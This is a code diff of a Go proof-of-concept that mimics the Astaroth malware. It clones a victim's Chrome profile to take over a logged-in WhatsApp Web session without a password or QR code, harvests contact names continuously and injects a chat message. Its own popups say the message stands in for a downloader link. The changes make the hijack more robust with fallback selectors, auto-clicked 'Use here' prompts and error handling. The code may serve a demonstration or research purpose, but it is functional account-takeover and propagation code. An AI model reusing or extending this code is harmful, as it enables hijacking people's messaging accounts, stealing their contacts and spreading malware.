@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"io"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
@@ -82,8 +83,6 @@ func findChromeProfile() string {
 }
 
 // --- Cópia do Perfil (técnica usada pelo Astaroth real) ---
-// O malware copia o perfil para evitar o erro "Profile in Use" quando o Chrome está aberto.
-// Copiamos apenas os arquivos essenciais para manter a sessão do WhatsApp.
 func copyProfile(srcDir string) (string, error) {
 	tempDir, err := os.MkdirTemp("", "astaroth-poc-*")
 	if err != nil {
@@ -92,8 +91,6 @@ func copyProfile(srcDir string) (string, error) {
 
 	fmt.Printf("[*] Copiando perfil para: %s\n", tempDir)
 
-	// Arquivos e pastas críticos para manter a sessão do WhatsApp Web
-	// O malware real copia tudo; aqui copiamos apenas o essencial
 	essentialItems := []string{
 		"Default",
 		"Local State",
@@ -106,7 +103,7 @@ func copyProfile(srcDir string) (string, error) {
 
 		info, err := os.Stat(src)
 		if err != nil {
-			continue // Item não existe, pula
+			continue
 		}
 
 		if info.IsDir() {
@@ -128,7 +125,7 @@ func copyProfile(srcDir string) (string, error) {
 func copyDir(src, dst string) error {
 	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
-			return nil // Pula arquivos com erro (locked files)
+			return nil
 		}
 
 		relPath, _ := filepath.Rel(src, path)
@@ -139,12 +136,13 @@ func copyDir(src, dst string) error {
 		}
 
 		// Pula arquivos grandes (cache, logs) para velocidade
-		if info.Size() > 50*1024*1024 { // > 50MB
+		if info.Size() > 50*1024*1024 {
 			return nil
 		}
 
 		// Pula pastas de cache para velocidade
-		if strings.Contains(relPath, "Cache") || strings.Contains(relPath, "Service Worker") {
+		if strings.Contains(relPath, "Cache") || strings.Contains(relPath, "Service Worker") ||
+			strings.Contains(relPath, "Code Cache") || strings.Contains(relPath, "GPUCache") {
 			return nil
 		}
 
@@ -155,7 +153,7 @@ func copyDir(src, dst string) error {
 func copyFile(src, dst string) error {
 	in, err := os.Open(src)
 	if err != nil {
-		return nil // Arquivo locked, pula silenciosamente
+		return nil
 	}
 	defer in.Close()
 
@@ -171,6 +169,72 @@ func copyFile(src, dst string) error {
 
 	_, err = io.Copy(out, in)
 	return err
+}
+
+// --- waitForWhatsApp: Aguarda o WhatsApp carregar com timeout e múltiplos seletores ---
+// Seletores baseados no DOM REAL do WhatsApp Web (analisado em 2026-03-08)
+func waitForWhatsApp(page *rod.Page) bool {
+	fmt.Println("[*] Detectando estado do WhatsApp Web (timeout: 90s)...")
+
+	// Tenta detectar qualquer um desses elementos por até 90s
+	for i := 0; i < 30; i++ {
+		time.Sleep(3 * time.Second)
+
+		// Seletor 1: Chat list pelo aria-label (DOM REAL do WhatsApp)
+		// <div aria-label="Chat list" role="grid" aria-rowcount="500">
+		chatList, _ := page.Element("[aria-label='Chat list']")
+		if chatList != nil {
+			fmt.Println("[+] Chat list detectada (aria-label)! Sessão ativa!")
+			return true
+		}
+
+		// Seletor 2: Grid com rowcount (lista virtualizada do WhatsApp)
+		grid, _ := page.Element("div[role='grid'][aria-rowcount]")
+		if grid != nil {
+			fmt.Println("[+] Grid de conversas detectada! Sessão ativa!")
+			return true
+		}
+
+		// Seletor 3: Rows de chat individuais
+		rows, _ := page.Elements("div[role='row']")
+		if len(rows) > 3 {
+			fmt.Printf("[+] %d conversas detectadas! Sessão ativa!\n", len(rows))
+			return true
+		}
+
+		// Seletor 4: Spans com title (nomes de contatos/grupos)
+		contacts, _ := page.Elements("span[dir='auto'][title]")
+		if len(contacts) > 3 {
+			fmt.Printf("[+] %d contatos detectados! Sessão ativa!\n", len(contacts))
+			return true
+		}
+
+		// Seletor 5: Fallbacks (data-testid, #pane-side)
+		for _, sel := range []string{"[data-testid='chat-list']", "#pane-side"} {
+			el, _ := page.Element(sel)
+			if el != nil {
+				fmt.Printf("[+] Elemento detectado (%s)! Sessão ativa!\n", sel)
+				return true
+			}
+		}
+
+		// Tenta clicar em botões "Usar aqui" / "Use here" / "Continuar"
+		page.Eval(`
+			document.querySelectorAll('div[role="button"], button').forEach(btn => {
+				let text = btn.textContent.toLowerCase();
+				if (text.includes('usar aqui') || text.includes('use here') || 
+				    text.includes('continuar') || text.includes('continue') ||
+				    text.includes('ok')) {
+					btn.click();
+				}
+			});
+		`)
+
+		fmt.Printf("    [~] Aguardando... (%ds/%ds)\n", (i+1)*3, 90)
+	}
+
+	fmt.Println("[!] Timeout: WhatsApp não carregou completamente.")
+	return false
 }
 
 func main() {
@@ -200,6 +264,8 @@ func main() {
 			fmt.Println("[!] Continuando sem sessão logada...")
 		} else {
 			l.UserDataDir(tempProfileDir)
+			// Forçar uso do perfil Default (onde o WhatsApp fica logado)
+			l.Set("profile-directory", "Default")
 			fmt.Println("[+] Perfil clonado! O Chrome pode continuar aberto normalmente.")
 		}
 	} else {
@@ -228,9 +294,16 @@ func main() {
 		fmt.Println("[*] Aguardando carregamento da sessão sequestrada...")
 	}
 
-	page.MustElement("[data-testid='chat-list']").MustWaitVisible()
-	fmt.Println("[+] WhatsApp Web carregado com sucesso!")
-	time.Sleep(2 * time.Second)
+	// Usa a função com timeout e múltiplos seletores
+	if !waitForWhatsApp(page) {
+		log.Println("[!] Não foi possível carregar o WhatsApp. Verifique o navegador.")
+		fmt.Println("[*] Pressione ENTER para fechar...")
+		var s string
+		fmt.Scanln(&s)
+		return
+	}
+
+	time.Sleep(3 * time.Second)
 
 	// ETAPA 3: Coleta de contatos em tempo real
 	fmt.Println("[3/4] Iniciando coleta de contatos em tempo real...")
@@ -239,14 +312,15 @@ func main() {
 	collectedContacts := []string{}
 
 	// Coleta inicial
-	initialElements := page.MustElements("span[title]")
+	initialElements, _ := page.Elements("span[title]")
 	for _, el := range initialElements {
-		name := el.MustText()
-		if name != "" && len(name) > 1 {
-			mu.Lock()
-			collectedContacts = append(collectedContacts, name)
-			mu.Unlock()
+		name, err := el.Text()
+		if err != nil || name == "" || len(name) <= 1 {
+			continue
 		}
+		mu.Lock()
+		collectedContacts = append(collectedContacts, name)
+		mu.Unlock()
 		if len(collectedContacts) >= 10 {
 			break
 		}
@@ -255,7 +329,7 @@ func main() {
 	// Mostra popup com os contatos coletados
 	if len(collectedContacts) > 0 {
 		popupText := fmt.Sprintf(
-			"SESSÃO WHATSAPP COMPROMETIDA!\n\n"+
+			"SESSAO WHATSAPP COMPROMETIDA!\n\n"+
 				"O malware conseguiu acessar sua conta\n"+
 				"SEM SENHA e SEM QR CODE.\n\n"+
 				"Contatos coletados em tempo real:\n"+
@@ -270,7 +344,7 @@ func main() {
 		)
 
 		go messageBox(
-			"Astaroth POC - Sessão Sequestrada",
+			"Astaroth POC - Sessao Sequestrada",
 			popupText,
 			MB_ICONWARNING|MB_TOPMOST,
 		)
@@ -285,13 +359,18 @@ func main() {
 	// Goroutine de monitoramento contínuo
 	go func() {
 		seen := make(map[string]bool)
+		mu.Lock()
 		for _, n := range collectedContacts {
 			seen[n] = true
 		}
+		mu.Unlock()
 
 		for {
 			time.Sleep(3 * time.Second)
-			elements := page.MustElements("span[title]")
+			elements, err := page.Elements("span[title]")
+			if err != nil {
+				continue
+			}
 			for _, el := range elements {
 				name, err := el.Text()
 				if err != nil || name == "" || len(name) <= 1 {
@@ -316,7 +395,13 @@ func main() {
 	var inputStr string
 	fmt.Scanln(&inputStr)
 
-	chatBox := page.MustElement("div[contenteditable='true'][data-tab='10']")
+	chatBox, err := page.Element("div[contenteditable='true'][data-tab='10']")
+	if err != nil {
+		log.Printf("[!] Não foi possível encontrar a caixa de texto: %v", err)
+		fmt.Println("[*] Pressione ENTER para fechar...")
+		fmt.Scanln(&inputStr)
+		return
+	}
 	chatBox.MustClick().MustInput(TestMessage)
 	chatBox.MustType(input.Enter)
 
@@ -326,13 +411,13 @@ func main() {
 	mu.Unlock()
 
 	go messageBox(
-		"Astaroth POC - Injeção Concluída",
+		"Astaroth POC - Injecao Concluida",
 		fmt.Sprintf(
 			"Mensagem enviada com sucesso!\n\n"+
-				"Conteúdo: \"%s\"\n\n"+
-				"Em um cenário real, essa mensagem\n"+
-				"conteria um link para o próximo\n"+
-				"estágio do malware (downloader).\n\n"+
+				"Conteudo: \"%s\"\n\n"+
+				"Em um cenario real, essa mensagem\n"+
+				"conteria um link para o proximo\n"+
+				"estagio do malware (downloader).\n\n"+
 				"Total de contatos coletados: %d",
 			TestMessage,
 			totalContacts,
